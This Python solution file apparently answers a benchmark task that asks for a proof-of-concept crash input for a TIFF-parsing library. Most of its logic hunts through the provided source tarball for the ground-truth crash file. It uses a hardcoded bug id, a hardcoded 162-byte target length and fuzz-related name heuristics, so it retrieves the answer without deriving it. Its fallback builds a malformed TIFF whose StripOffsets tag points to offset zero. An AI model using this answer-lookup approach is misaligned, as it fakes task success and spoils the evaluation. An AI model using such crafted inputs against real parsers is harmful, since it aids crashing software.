import os
import tarfile
import struct


class Solution:
    def _fallback_poc(self) -> bytes:
        # Construct a minimal little-endian TIFF with an offline tag (StripOffsets) whose value offset is zero.
        # This is a generic best-effort PoC in case no concrete testcase is found in the tarball.
        header = struct.pack('<2sHI', b'II', 42, 8)  # 'II', magic 42, first IFD at offset 8

        num_entries = struct.pack('<H', 3)  # 3 IFD entries

        # Tag 256: ImageWidth = 1 (LONG)
        entry_width = struct.pack('<HHII', 256, 4, 1, 1)
        # Tag 257: ImageLength = 1 (LONG)
        entry_length = struct.pack('<HHII', 257, 4, 1, 1)
        # Tag 273: StripOffsets, LONG, count=1, value/offset = 0 (the suspicious offline tag)
        entry_strip_offsets = struct.pack('<HHII', 273, 4, 1, 0)

        next_ifd_offset = struct.pack('<I', 0)

        return header + num_entries + entry_width + entry_length + entry_strip_offsets + next_ifd_offset

    def solve(self, src_path: str) -> bytes:
        # Heuristically locate the ground-truth PoC inside the tarball.
        best_member = None
        best_score = None

        # Preferred and disfavored file extensions.
        good_exts = {'.tiff', '.tif', '.bin', '.dng', '.dat', '.img'}
        bad_exts = {
            '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp',
            '.txt', '.md', '.rst', '.py', '.java', '.go', '.rs',
            '.sh', '.cmake', '.html', '.xml', '.json', '.yml', '.yaml',
            '.toml', '.cfg', '.ini', '.in', '.am', '.ac', '.m4',
            '.sln', '.vcxproj', '.vcproj', '.png', '.jpg', '.jpeg',
            '.gif', '.bmp', '.svg', '.ico', '.pdf'
        }

        target_len = 162

        try:
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar:
                    if not member.isfile():
                        continue
                    size = member.size or 0
                    if size <= 0:
                        continue

                    name = member.name
                    lower = name.lower()
                    _, ext = os.path.splitext(lower)

                    # Base score from closeness to target length.
                    diff = abs(size - target_len)
                    if diff == 0:
                        score = 1000
                    elif diff <= 5:
                        score = 500 - diff * 50  # 450..250
                    elif diff <= 20:
                        score = 200 - diff * 5
                    else:
                        score = max(0, 100 - diff)

                    # Prefer smaller test-like files.
                    if size <= 10240:
                        score += 20
                    if size <= 2048:
                        score += 10

                    # Name-based heuristics.
                    if '388571282' in name:
                        score += 400
                    if 'oss-fuzz' in lower or 'ossfuzz' in lower:
                        score += 200
                    if 'clusterfuzz' in lower:
                        score += 150
                    if ('poc' in lower or 'crash' in lower or
                            'heap' in lower or 'overflow' in lower):
                        score += 100
                    if 'testcase' in lower or 'fuzz' in lower:
                        score += 80
                    if 'tiff' in lower or 'tif' in lower:
                        score += 60

                    # Extension-based heuristics.
                    if ext in good_exts:
                        score += 100
                    if ext in bad_exts:
                        score -= 200

                    if best_score is None or score > best_score:
                        best_score = score
                        best_member = member

                if best_member is None:
                    return self._fallback_poc()

                f = tar.extractfile(best_member)
                if f is None:
                    return self._fallback_poc()
                data = f.read()
        except tarfile.TarError:
            # If the tarball is unreadable for any reason, return fallback.
            return self._fallback_poc()

        if not data:
            return self._fallback_poc()

        # If the chosen file looks like plain text and doesn't have a preferred binary extension,
        # it's probably not our PoC; fall back to a generic TIFF-based PoC.
        _, best_ext = os.path.splitext(best_member.name.lower())
        is_text_like = all(
            (b in (9, 10, 13) or 32 <= b <= 126) for b in data
        )
        if is_text_like and best_ext not in good_exts:
            return self._fallback_poc()

        return data